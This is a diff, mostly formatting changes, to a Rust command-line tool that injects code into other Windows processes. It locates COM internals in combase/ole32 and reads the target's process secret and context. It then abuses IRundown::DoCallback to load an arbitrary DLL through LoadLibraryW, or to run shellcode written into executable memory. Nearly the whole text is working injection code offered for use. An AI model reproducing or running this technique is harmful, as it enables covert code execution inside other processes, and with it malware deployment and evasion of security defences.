@@ -1,25 +1,45 @@
 #![allow(non_snake_case, non_upper_case_globals, non_camel_case_types)]
 pub mod combase;
-use anyhow::{Result, Context};
+use anyhow::{Context, Result};
+use base64::{engine::general_purpose, Engine as _};
 use combase::*;
-use windows::{
-    w,
-    Win32::{
-        System::{
-            Com::{
-                CoInitializeEx, CoUninitialize, IStream, COINIT_MULTITHREADED, MSHCTX_INPROC,
-                STREAM_SEEK_SET, StringFromIID, CoGetObject, Marshal::CoUnmarshalInterface,
-            },
-            LibraryLoader::{GetModuleHandleW, GetProcAddress}, Diagnostics::{Debug::{ReadProcessMemory, WriteProcessMemory}, ToolHelp::{PROCESSENTRY32, CreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, Process32First, Process32Next}}, Threading::{OpenProcess, PROCESS_VM_READ, PROCESS_QUERY_LIMITED_INFORMATION, GetCurrentProcessId, OpenThread, THREAD_QUERY_INFORMATION, NtQueryInformationThread, THREADINFOCLASS, PROCESS_VM_WRITE, PROCESS_VM_OPERATION}, Registry::{RegGetValueA, HKEY_CLASSES_ROOT, RRF_RT_REG_SZ, RegGetValueW}, Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, VirtualProtectEx, PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS},
-        },
-        UI::Shell::SHCreateMemStream, Foundation::{HANDLE, CloseHandle},
-    }, core::{PCSTR, PWSTR, PCWSTR}, s,
-};
-use base64::{Engine as _, engine::general_purpose};
 use std::{
     ffi::c_void,
     mem::{size_of, zeroed},
-    ptr::null_mut
+    ptr::null_mut,
+};
+use windows::{
+    core::{PCSTR, PCWSTR},
+    s, w,
+    Win32::{
+        Foundation::{CloseHandle, HANDLE},
+        System::{
+            Com::{
+                CoGetObject, CoInitializeEx, CoUninitialize, IStream,
+                Marshal::CoUnmarshalInterface, StringFromIID, COINIT_MULTITHREADED, MSHCTX_INPROC,
+                STREAM_SEEK_SET,
+            },
+            Diagnostics::{
+                Debug::{ReadProcessMemory, WriteProcessMemory},
+                ToolHelp::{
+                    CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32,
+                    TH32CS_SNAPPROCESS,
+                },
+            },
+            LibraryLoader::{GetModuleHandleW, GetProcAddress},
+            Memory::{
+                VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ,
+                PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
+            },
+            Registry::{RegGetValueW, HKEY_CLASSES_ROOT, RRF_RT_REG_SZ},
+            Threading::{
+                GetCurrentProcessId, NtQueryInformationThread, OpenProcess, OpenThread,
+                PROCESS_QUERY_LIMITED_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ,
+                PROCESS_VM_WRITE, THREADINFOCLASS, THREAD_QUERY_INFORMATION,
+            },
+        },
+        UI::Shell::SHCreateMemStream,
+    },
 };
 
 #[repr(C)]
@@ -331,16 +351,20 @@ unsafe fn get_com_data(ctx: *mut COM_CONTEXT) -> Result<(), ::windows::core::Err
     #[cfg(target_pointer_width = "32")]
     type IMAGE_NT_HEADERS = ::windows::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS32;
     type PIMAGE_NT_HEADERS = *mut IMAGE_NT_HEADERS;
-    
+
     // old systems use ole32
-    let m: *mut u8 = ::core::mem::transmute(GetModuleHandleW(w!("combase")).or_else(|_| GetModuleHandleW(w!("ole32")))?);
+    let m: *mut u8 = ::core::mem::transmute(
+        GetModuleHandleW(w!("combase")).or_else(|_| GetModuleHandleW(w!("ole32")))?,
+    );
     let dos: PIMAGE_DOS_HEADERS = m.offset(0) as _;
     let nt: PIMAGE_NT_HEADERS = m.offset((*dos).e_lfanew as _) as _;
     let sec_count = (*nt).FileHeader.NumberOfSections;
-    let sections: &[windows::Win32::System::Diagnostics::Debug::IMAGE_SECTION_HEADER] = ::core::slice::from_raw_parts(
-        m.offset((*dos).e_lfanew as _).offset(size_of::<IMAGE_NT_HEADERS>() as _) as *mut _,
-        sec_count as _
-    );
+    let sections: &[windows::Win32::System::Diagnostics::Debug::IMAGE_SECTION_HEADER] =
+        ::core::slice::from_raw_parts(
+            m.offset((*dos).e_lfanew as _)
+                .offset(size_of::<IMAGE_NT_HEADERS>() as _) as *mut _,
+            sec_count as _,
+        );
 
     for i in 0..sec_count {
         let cur_sec = sections[usize::from(i)];
@@ -356,23 +380,26 @@ unsafe fn get_com_data(ctx: *mut COM_CONTEXT) -> Result<(), ::windows::core::Err
     Ok(())
 }
 
-unsafe fn find_com_data(cc: *mut COM_CONTEXT, inbuf: *mut u8, inlen: usize) -> Result<u32, ::windows::core::Error> {
-    let mut rva = 0;
-
+unsafe fn find_com_data(
+    cc: *mut COM_CONTEXT,
+    inbuf: *mut u8,
+    inlen: usize,
+) -> Result<u32, ::windows::core::Error> {
     let db = (*cc).base + (*cc).data as usize;
-
 
     for i in 0..(*cc).size - inlen as u32 {
         let x: &[u8] = ::core::slice::from_raw_parts((db + i as usize) as *mut _, inlen);
         let y: &[u8] = ::core::slice::from_raw_parts(inbuf, inlen);
-        
+
         if x == y {
-            rva = (db + i as usize - (*cc).base) as _;
+            let rva = (db + i as usize - (*cc).base) as _;
             return Ok(rva);
         }
     }
 
-    return Err(::windows::core::Error::from(windows::Win32::Foundation::E_INVALIDARG));
+    return Err(::windows::core::Error::from(
+        windows::Win32::Foundation::E_INVALIDARG,
+    ));
 }
 
 // 搜索 CIPIDTable::_palloc 偏移
@@ -384,7 +411,7 @@ unsafe fn find_ipid_table(cc: *mut COM_CONTEXT) -> Result<(), ::windows::core::E
         let cpage = db.offset(i as _) as *mut _ as *mut CPageAllocator;
 
         // Legacy systems use 0x70, current is 0x78，找的不对会导致后面步骤访问到无效地址
-        if (*cpage)._pgalloc._cbPerEntry>= 0x70 {
+        if (*cpage)._pgalloc._cbPerEntry >= 0x70 {
             if (*cpage)._pgalloc._cEntriesPerPage != 0x32 {
                 continue;
             }
@@ -421,7 +448,9 @@ unsafe fn find_ipid_table(cc: *mut COM_CONTEXT) -> Result<(), ::windows::core::E
         }
     }
 
-    Err(::windows::core::Error::from(windows::Win32::Foundation::E_INVALIDARG))
+    Err(::windows::core::Error::from(
+        windows::Win32::Foundation::E_INVALIDARG,
+    ))
 }
 
 // 搜索 OXIDEntry._moxid 偏移
@@ -437,7 +466,10 @@ unsafe fn find_oxid_offset(cc: *mut COM_CONTEXT) -> Result<(), ::windows::core::
 
     for ofs in 0..256u32 {
         let x: &[u8] = ::core::slice::from_raw_parts(buf.offset(ofs as _), size_of::<IPID>());
-        let y: &[u8] = ::core::slice::from_raw_parts(::core::mem::transmute(&(*entry).ipid), size_of::<IPID>());
+        let y: &[u8] = ::core::slice::from_raw_parts(
+            ::core::mem::transmute(&(*entry).ipid),
+            size_of::<IPID>(),
+        );
 
         if x == y {
             if ofs == IPID_OFFSET_LEGACY {
@@ -445,13 +477,17 @@ unsafe fn find_oxid_offset(cc: *mut COM_CONTEXT) -> Result<(), ::windows::core::
             } else if ofs == IPID_OFFSET_CURRENT {
                 (*cc).oxid = MOXID_OFFSET_CURRENT;
             } else {
-                return Err(::windows::core::Error::from(windows::Win32::Foundation::E_INVALIDARG));
+                return Err(::windows::core::Error::from(
+                    windows::Win32::Foundation::E_INVALIDARG,
+                ));
             }
             return Ok(());
         }
     }
 
-    Err(::windows::core::Error::from(windows::Win32::Foundation::E_INVALIDARG))
+    Err(::windows::core::Error::from(
+        windows::Win32::Foundation::E_INVALIDARG,
+    ))
 }
 
 // 从 combase.dll 或者 ole32.dll 中读取在远程进程中执行 IRundown::DoCallback 所需要的一切信息
@@ -478,12 +514,20 @@ unsafe fn init_cc(cc: *mut COM_CONTEXT) -> Result<(), windows::core::Error> {
     get_com_data(cc)?;
 
     // 找到 g_pMTAEmptyCtx
-    (*cc).server_ctx = find_com_data(cc, ::core::mem::transmute(&hdr.uCtxHdr.ByRefHdr.pServerCtx), size_of::<ULONG_PTR>())?;
+    (*cc).server_ctx = find_com_data(
+        cc,
+        ::core::mem::transmute(&hdr.uCtxHdr.ByRefHdr.pServerCtx),
+        size_of::<ULONG_PTR>(),
+    )?;
 
     // 找到 CProcessSecret::s_guidOle32Secret
-    (*cc).secret = find_com_data(cc, ::core::mem::transmute(&hdr.uCtxHdr.ByRefHdr.guidProcessSecret), size_of::<::windows::core::GUID>())?;
+    (*cc).secret = find_com_data(
+        cc,
+        ::core::mem::transmute(&hdr.uCtxHdr.ByRefHdr.guidProcessSecret),
+        size_of::<::windows::core::GUID>(),
+    )?;
 
-     // 找到 CIPIDTable::_palloc
+    // 找到 CIPIDTable::_palloc
     find_ipid_table(cc)?;
 
     // 找到 OXIDEntry._moxid
@@ -499,24 +543,48 @@ unsafe fn get_ipid_entries(cc: *mut COM_CONTEXT, hp: HANDLE) -> Option<Vec<IPID_
 
     // 读取 CPageAllocator，如果报错意味着远程进程没有 COM
     let mut cpage: CPageAllocator = zeroed();
-    if !ReadProcessMemory(hp, ipid_tbl as *const _, &mut cpage as *mut _ as *mut _, size_of::<CPageAllocator>(), None).as_bool() {
+    if !ReadProcessMemory(
+        hp,
+        ipid_tbl as *const _,
+        &mut cpage as *mut _ as *mut _,
+        size_of::<CPageAllocator>(),
+        None,
+    )
+    .as_bool()
+    {
         return None;
     }
 
     // 读取所有 page 地址
     let page_cnt = cpage._pgalloc._cPages as usize;
     let mut pages: Vec<ULONG_PTR> = Vec::with_capacity(page_cnt);
-    if !ReadProcessMemory(hp, cpage._pgalloc._pPageListStart as *mut _ as *mut _, pages.as_mut_ptr() as *mut _ as *mut _, page_cnt * size_of::<ULONG_PTR>(), None).as_bool() {
+    if !ReadProcessMemory(
+        hp,
+        cpage._pgalloc._pPageListStart as *mut _ as *mut _,
+        pages.as_mut_ptr() as *mut _ as *mut _,
+        page_cnt * size_of::<ULONG_PTR>(),
+        None,
+    )
+    .as_bool()
+    {
         return None;
     }
     pages.set_len(page_cnt);
 
     // 循环 page
-    let ipid_cnt = cpage._pgalloc._cEntriesPerPage as usize;    // 每页的 IPIDEntry 数量
+    let ipid_cnt = cpage._pgalloc._cEntriesPerPage as usize; // 每页的 IPIDEntry 数量
     for page in pages {
         let mut page_entries: Vec<IPIDEntry> = Vec::with_capacity(ipid_cnt);
 
-        if !ReadProcessMemory(hp, page as *const _, page_entries.as_mut_ptr() as *mut _ as *mut _, ipid_cnt * size_of::<IPIDEntry>(), None).as_bool() {
+        if !ReadProcessMemory(
+            hp,
+            page as *const _,
+            page_entries.as_mut_ptr() as *mut _ as *mut _,
+            ipid_cnt * size_of::<IPIDEntry>(),
+            None,
+        )
+        .as_bool()
+        {
             return None;
         }
         page_entries.set_len(ipid_cnt);
@@ -543,7 +611,15 @@ unsafe fn get_ipid_entries(cc: *mut COM_CONTEXT, hp: HANDLE) -> Option<Vec<IPID_
             // 读取 _moxid (OXID and OID)
             let pOxidEntry = e.pOXIDEntry as *mut u8;
             let mut tmp: [u64; 2] = zeroed();
-            if !ReadProcessMemory(hp, pOxidEntry.offset((*cc).oxid as _) as *const _, tmp.as_mut_ptr() as *mut _, tmp.len() * size_of::<u64>(), None).as_bool() {
+            if !ReadProcessMemory(
+                hp,
+                pOxidEntry.offset((*cc).oxid as _) as *const _,
+                tmp.as_mut_ptr() as *mut _,
+                tmp.len() * size_of::<u64>(),
+                None,
+            )
+            .as_bool()
+            {
                 continue;
             }
 
@@ -565,26 +641,41 @@ unsafe fn get_ipid_entries(cc: *mut COM_CONTEXT, hp: HANDLE) -> Option<Vec<IPID_
 }
 
 // 列出一个进程中的 IPID
-unsafe fn dump_ipid(cc: *mut COM_CONTEXT, pe: &mut PROCESSENTRY32) -> Result<(), ::windows::core::Error> {
+unsafe fn dump_ipid(
+    cc: *mut COM_CONTEXT,
+    pe: &mut PROCESSENTRY32,
+) -> Result<(), ::windows::core::Error> {
     // let ret = false;
 
     let hp = OpenProcess(
         PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION,
         false,
-        pe.th32ProcessID
+        pe.th32ProcessID,
     )?;
 
     let ret = loop {
         match get_ipid_entries(cc, hp) {
             Some(entries) => {
                 println!("\n**************************************");
-                println!("Process: {} [{}]", PCSTR::from_raw(pe.szExeFile.as_ptr() as *mut _).to_string().unwrap_or(String::from("_")), pe.th32ProcessID);
+                println!(
+                    "Process: {} [{}]",
+                    PCSTR::from_raw(pe.szExeFile.as_ptr() as *mut _)
+                        .to_string()
+                        .unwrap_or(String::from("_")),
+                    pe.th32ProcessID
+                );
                 println!("");
 
                 for e in entries {
-                    let iid = StringFromIID(&e.iid)?.to_string().unwrap_or(String::from("N/A"));
-                    let ipid = StringFromIID(&e.ipid as *const _ as *mut _)?.to_string().unwrap_or(String::from("N/A"));
-                    let oxid = StringFromIID(&e.oxid as *const _ as *mut _)?.to_string().unwrap_or(String::from("N/A"));
+                    let iid = StringFromIID(&e.iid)?
+                        .to_string()
+                        .unwrap_or(String::from("N/A"));
+                    let ipid = StringFromIID(&e.ipid as *const _ as *mut _)?
+                        .to_string()
+                        .unwrap_or(String::from("N/A"));
+                    let oxid = StringFromIID(&e.oxid as *const _ as *mut _)?
+                        .to_string()
+                        .unwrap_or(String::from("N/A"));
 
                     let mut iname: [u16; 260] = zeroed();
                     let mut ipath: Vec<u16> = w!("Interface\\").as_wide().to_vec();
@@ -599,13 +690,22 @@ unsafe fn dump_ipid(cc: *mut COM_CONTEXT, pe: &mut PROCESSENTRY32) -> Result<(),
                         RRF_RT_REG_SZ,
                         None,
                         Some(iname.as_mut_ptr() as *mut _),
-                        Some(&mut len)
-                    ).is_ok() {
-                        println!("IPID:{}, OXID:{} : {}", ipid, oxid, PCWSTR::from_raw(iname.as_ptr()).to_string().unwrap_or(String::from("_")));
+                        Some(&mut len),
+                    )
+                    .is_ok()
+                    {
+                        println!(
+                            "IPID:{}, OXID:{} : {}",
+                            ipid,
+                            oxid,
+                            PCWSTR::from_raw(iname.as_ptr())
+                                .to_string()
+                                .unwrap_or(String::from("_"))
+                        );
                     }
                 }
             }
-            None => break Err(::windows::core::Error::from_win32())
+            None => break Err(::windows::core::Error::from_win32()),
         }
         break Ok(());
     };
@@ -638,12 +738,15 @@ unsafe fn list_ipid(cc: *mut COM_CONTEXT) -> Result<(), ::windows::core::Error> 
 }
 
 // 调用 CoGetObject() 或 CoUnmarshalInterface() 获取远程进程 IRundown 接口实例
-unsafe fn get_irundown_instance(cc: *mut COM_CONTEXT, rc: *mut RUNDOWN_CONTEXT) -> Result<IRundown, ::windows::core::Error> {
+unsafe fn get_irundown_instance(
+    cc: *mut COM_CONTEXT,
+    rc: *mut RUNDOWN_CONTEXT,
+) -> Result<IRundown, ::windows::core::Error> {
     // 设置请求头
     let mut objref: OBJREF = zeroed();
 
-    objref.signature = OBJREF_SIGNATURE;    // "MEOW"
-    objref.flags = OBJREF_STANDARD;         // type
+    objref.signature = OBJREF_SIGNATURE; // "MEOW"
+    objref.flags = OBJREF_STANDARD; // type
     objref.iid = <IRundown as ::windows::core::Interface>::IID;
 
     // 设置标准对象 (STDOBJREF)
@@ -660,31 +763,46 @@ unsafe fn get_irundown_instance(cc: *mut COM_CONTEXT, rc: *mut RUNDOWN_CONTEXT) 
 
     if (*cc).use_objref {
         let mut name = String::from("OBJREF:");
-        name.push_str(&general_purpose::STANDARD.encode(::core::slice::from_raw_parts(&objref as *const _ as *const _, size_of::<OBJREF>())));
+        name.push_str(
+            &general_purpose::STANDARD.encode(::core::slice::from_raw_parts(
+                &objref as *const _ as *const _,
+                size_of::<OBJREF>(),
+            )),
+        );
         name.push_str(":");
 
         let mut rundown = ::core::mem::MaybeUninit::<IRundown>::uninit();
-        CoGetObject(PCWSTR::from_raw(name.encode_utf16().collect::<Vec<u16>>().as_ptr()), None, &<IRundown as ::windows::core::Interface>::IID, rundown.as_mut_ptr() as _)?;
+        CoGetObject(
+            PCWSTR::from_raw(name.encode_utf16().collect::<Vec<u16>>().as_ptr()),
+            None,
+            &<IRundown as ::windows::core::Interface>::IID,
+            rundown.as_mut_ptr() as _,
+        )?;
         Ok(rundown.assume_init())
         // CoGetObject(w!("OBJREF:TUVPVwEAAAA0AQAAAAAAAMAAAAAAAABGAAAAAAEAAAAtAZskopElke6F1v4liCkBAGQAAFwJUCkN+6SiS4Oq5QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==:"), None, &<IRundown as ::windows::core::Interface>::IID, rundown.as_mut_ptr() as _)?;
     } else {
         match SHCreateMemStream(None) {
             Some(pstm) => {
-                pstm.Write(&objref as *const _ as *const _, size_of::<OBJREF>() as _, None).ok()?;
+                pstm.Write(
+                    &objref as *const _ as *const _,
+                    size_of::<OBJREF>() as _,
+                    None,
+                )
+                .ok()?;
                 pstm.Seek(0, STREAM_SEEK_SET)?;
 
                 Ok(CoUnmarshalInterface(&pstm)?)
             }
-            None => {
-                Err(::windows::core::Error::from_win32())
-            }
+            None => Err(::windows::core::Error::from_win32()),
         }
-        
     }
 }
 
 // 调用 IRundown::DoCallback 执行代码
-unsafe fn invoke_docallback(cc: *mut COM_CONTEXT, rc: *mut RUNDOWN_CONTEXT) -> Result<(), ::windows::core::Error> {
+unsafe fn invoke_docallback(
+    cc: *mut COM_CONTEXT,
+    rc: *mut RUNDOWN_CONTEXT,
+) -> Result<(), ::windows::core::Error> {
     let rundown = get_irundown_instance(cc, rc)?;
 
     let mut params: XAptCallback = zeroed();
@@ -730,7 +848,14 @@ unsafe fn init_rundown_ctx(cc: *mut COM_CONTEXT, rc: *mut RUNDOWN_CONTEXT) -> Re
         let mut success = false;
         for _ in 0..2 {
             // 尝试读取远程进程中的 GUID secret
-            ReadProcessMemory(hp, ((*cc).base + (*cc).secret as usize) as *const _, &mut (*rc).guidProcessSecret as *const _ as *mut _, size_of::<windows::core::GUID>(), None).ok()?;
+            ReadProcessMemory(
+                hp,
+                ((*cc).base + (*cc).secret as usize) as *const _,
+                &mut (*rc).guidProcessSecret as *const _ as *mut _,
+                size_of::<windows::core::GUID>(),
+                None,
+            )
+            .ok()?;
             // 如果未初始化，不带参数执行 IRundown::DoCallback
             if (*rc).guidProcessSecret.to_u128() == 0x0 {
                 println!("WARNING: GUID Secret is not initialised!...");
@@ -754,7 +879,13 @@ unsafe fn init_rundown_ctx(cc: *mut COM_CONTEXT, rc: *mut RUNDOWN_CONTEXT) -> Re
             match OpenThread(THREAD_QUERY_INFORMATION, false, tid) {
                 Ok(hthread) => {
                     let mut tbi: THREAD_BASIC_INFORMATION = zeroed();
-                    match NtQueryInformationThread(hthread, THREADINFOCLASS(0), &mut tbi as *mut _ as *mut _, size_of::<THREAD_BASIC_INFORMATION>() as _, null_mut()) {
+                    match NtQueryInformationThread(
+                        hthread,
+                        THREADINFOCLASS(0),
+                        &mut tbi as *mut _ as *mut _,
+                        size_of::<THREAD_BASIC_INFORMATION>() as _,
+                        null_mut(),
+                    ) {
                         Ok(()) => {
                             let mut ReservedForOle: *mut c_void = null_mut();
                             // offsetof(_TEB32, ReservedForOle) = 0xf80
@@ -763,14 +894,30 @@ unsafe fn init_rundown_ctx(cc: *mut COM_CONTEXT, rc: *mut RUNDOWN_CONTEXT) -> Re
                             const offset_ReservedForOle: isize = 0x1758;
                             #[cfg(target_arch = "x86")]
                             const offset_ReservedForOle: isize = 0xf80;
-                            if ReadProcessMemory(hp, tbi.TebBaseAddress.offset(offset_ReservedForOle) as *mut _, &mut ReservedForOle as *mut _ as *mut _, size_of::<usize>(), None).as_bool() {
+                            if ReadProcessMemory(
+                                hp,
+                                tbi.TebBaseAddress.offset(offset_ReservedForOle) as *mut _,
+                                &mut ReservedForOle as *mut _ as *mut _,
+                                size_of::<usize>(),
+                                None,
+                            )
+                            .as_bool()
+                            {
                                 let mut oleTlsData: SOleTlsData = zeroed();
-                                if ReadProcessMemory(hp, ReservedForOle, &mut oleTlsData as *mut _ as *mut _, size_of::<SOleTlsData>(), None).as_bool() {
+                                if ReadProcessMemory(
+                                    hp,
+                                    ReservedForOle,
+                                    &mut oleTlsData as *mut _ as *mut _,
+                                    size_of::<SOleTlsData>(),
+                                    None,
+                                )
+                                .as_bool()
+                                {
                                     (*rc).pServerCtx = oleTlsData.pCurrentContext;
                                 }
                             }
                         }
-                        Err(_) => { }
+                        Err(_) => {}
                     }
                     CloseHandle(hthread);
                 }
@@ -782,7 +929,14 @@ unsafe fn init_rundown_ctx(cc: *mut COM_CONTEXT, rc: *mut RUNDOWN_CONTEXT) -> Re
         if (*rc).pServerCtx.is_null() {
             // 从全局变量读取: g_pMTAEmptyCtx
             println!("Reading server context from g_pMTAEmptyCtx");
-            ReadProcessMemory(hp, ((*cc).base as *mut u8).offset((*cc).server_ctx as _) as *mut _, &mut (*rc).pServerCtx as *mut _ as *mut _, size_of::<usize>(), None).ok()?;
+            ReadProcessMemory(
+                hp,
+                ((*cc).base as *mut u8).offset((*cc).server_ctx as _) as *mut _,
+                &mut (*rc).pServerCtx as *mut _ as *mut _,
+                size_of::<usize>(),
+                None,
+            )
+            .ok()?;
         }
 
         println!("pServerCtx: {:p}", (*rc).pServerCtx);
@@ -797,7 +951,11 @@ unsafe fn init_rundown_ctx(cc: *mut COM_CONTEXT, rc: *mut RUNDOWN_CONTEXT) -> Re
 
 unsafe fn inject_dll(cc: *mut COM_CONTEXT, rc: *mut RUNDOWN_CONTEXT) -> Result<()> {
     // 打开目标进程
-    let hp = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, false, (*cc).pid)?;
+    let hp = OpenProcess(
+        PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
+        false,
+        (*cc).pid,
+    )?;
 
     let start_inject = move || -> Result<()> {
         // 写入 DLL 路径到目标内存
@@ -806,20 +964,36 @@ unsafe fn inject_dll(cc: *mut COM_CONTEXT, rc: *mut RUNDOWN_CONTEXT) -> Result<(
         }
         let mut u_path: Vec<u16> = (*cc).path.encode_utf16().collect();
         u_path.push(0x0);
-        let m = VirtualAllocEx(hp, None, u_path.len() * size_of::<u16>(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        let m = VirtualAllocEx(
+            hp,
+            None,
+            u_path.len() * size_of::<u16>(),
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE,
+        );
         if m.is_null() {
             return Err(::anyhow::Error::msg("VirtualAllocEx failed"));
         }
-        WriteProcessMemory(hp, m, u_path.as_ptr() as *const _, u_path.len() * size_of::<u16>(), None).ok()?;
+        WriteProcessMemory(
+            hp,
+            m,
+            u_path.as_ptr() as *const _,
+            u_path.len() * size_of::<u16>(),
+            None,
+        )
+        .ok()?;
         // 获取 LoadLibraryW 地址
-        let pLoadLibraryW: *mut c_void = ::core::mem::transmute(GetProcAddress(GetModuleHandleW(w!("kernel32"))?, s!("LoadLibraryW")));
+        let pLoadLibraryW: *mut c_void = ::core::mem::transmute(GetProcAddress(
+            GetModuleHandleW(w!("kernel32"))?,
+            s!("LoadLibraryW"),
+        ));
         if pLoadLibraryW.is_null() {
             return Err(::anyhow::Error::msg("GetProcAddress failed"));
         }
-        
+
         println!("pfnCallback:\t{:p}(LoadLibraryW)", pLoadLibraryW);
         println!("pParam:\t{:p}", m);
-        
+
         // 调用 IRundown::DoCallback 加载 DLL
         (*rc).pfnCallback = pLoadLibraryW;
         (*rc).pParam = m;
@@ -837,7 +1011,11 @@ unsafe fn inject_dll(cc: *mut COM_CONTEXT, rc: *mut RUNDOWN_CONTEXT) -> Result<(
 
 unsafe fn inject_shellcode(cc: *mut COM_CONTEXT, rc: *mut RUNDOWN_CONTEXT) -> Result<()> {
     // 打开目标进程
-    let hp = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, false, (*cc).pid)?;
+    let hp = OpenProcess(
+        PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
+        false,
+        (*cc).pid,
+    )?;
 
     let start_inject = move || -> Result<()> {
         // 读取 shellcode 内容
@@ -846,18 +1024,19 @@ unsafe fn inject_shellcode(cc: *mut COM_CONTEXT, rc: *mut RUNDOWN_CONTEXT) -> Re
         }
         let sc = std::fs::read((*cc).path.clone())?;
         // 写入 DLL 路径到目标内存
-        let pShellcode = VirtualAllocEx(hp, None, sc.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        let pShellcode =
+            VirtualAllocEx(hp, None, sc.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if pShellcode.is_null() {
             return Err(::anyhow::Error::msg("VirtualAllocEx failed"));
         }
         WriteProcessMemory(hp, pShellcode, sc.as_ptr() as *const _, sc.len(), None).ok()?;
         let mut oldprotect: PAGE_PROTECTION_FLAGS = zeroed();
         VirtualProtectEx(hp, pShellcode, sc.len(), PAGE_EXECUTE_READ, &mut oldprotect).ok()?;
-        
+
         let m: *mut c_void = null_mut();
         println!("pfnCallback:\t{:p}(shellcode)", pShellcode);
         println!("pParam:\t{:p}", m);
-        
+
         // 调用 IRundown::DoCallback 加载 DLL
         (*rc).pfnCallback = pShellcode;
         (*rc).pParam = m;
@@ -903,7 +1082,7 @@ fn main() -> Result<()> {
     match matches.subcommand() {
         Some(("inject", sub_matches)) => {
             cc.pid = *sub_matches.get_one::<u32>("pid").expect("required");
-            cc.use_objref = *sub_matches.get_one::<bool>("method") .expect("required");
+            cc.use_objref = *sub_matches.get_one::<bool>("method").expect("required");
 
             unsafe {
                 // 初始化 COM
@@ -914,15 +1093,22 @@ fn main() -> Result<()> {
                     init_cc(&mut cc).with_context(|| "Init COM_CONTEXT failed")?;
                     // 初始化 RUNDOWN_CONTEXT
                     let mut rc: RUNDOWN_CONTEXT = zeroed();
-                    init_rundown_ctx(&mut cc, &mut rc).with_context(|| "Init RUNDOWN_CONTEXT failed")?;
+                    init_rundown_ctx(&mut cc, &mut rc)
+                        .with_context(|| "Init RUNDOWN_CONTEXT failed")?;
                     if sub_matches.contains_id("dll") {
                         cc.inject_dll = true;
-                        cc.path = sub_matches.get_one::<String>("dll").expect("required").clone();
+                        cc.path = sub_matches
+                            .get_one::<String>("dll")
+                            .expect("required")
+                            .clone();
                         // 调用 IRundown::DoCallback 完成 DLL 注入
                         inject_dll(&mut cc, &mut rc).with_context(|| "注入失败")?;
                     } else {
                         cc.inject_pic = true;
-                        cc.path = sub_matches.get_one::<String>("shellcode").expect("required").clone();
+                        cc.path = sub_matches
+                            .get_one::<String>("shellcode")
+                            .expect("required")
+                            .clone();
                         // 调用 IRundown::DoCallback 完成 shellcode 注入
                         inject_shellcode(&mut cc, &mut rc).with_context(|| "注入失败")?;
                     }
@@ -937,7 +1123,7 @@ fn main() -> Result<()> {
         }
         Some(("list", sub_matches)) => {
             cc.pid = *sub_matches.get_one::<u32>("pid").unwrap_or(&0);
-            cc.verbose = *sub_matches.get_one::<bool>("verbose") .expect("required");
+            cc.verbose = *sub_matches.get_one::<bool>("verbose").expect("required");
 
             unsafe {
                 // 初始化 COM
@@ -957,32 +1143,7 @@ fn main() -> Result<()> {
                 ret
             }
         }
-        _ => unreachable!()
+        _ => unreachable!(),
     }
-
-
-    // unsafe {
-    //     // 初始化 COM
-    //     CoInitializeEx(None, COINIT_MULTITHREADED).unwrap();
-
-        
-    //     cc.verbose = false;
-    //     cc.pid = 13272;
-    //     cc.use_objref = false;
-
-    //     init_cc(&mut cc).unwrap();
-
-    //     // list_ipid(&mut cc).unwrap();
-
-    //     let hp = OpenProcess(PROCESS_VM_READ, false, cc.pid).unwrap();
-
-    //     let mut rc: RUNDOWN_CONTEXT = zeroed();
-    //     init_rundown_ctx(hp, &mut cc, &mut rc).unwrap();
-
-    //     CloseHandle(hp);
-
-    //     CoUninitialize();
-
-    //     println!("Hello, world!");
     // }
 }
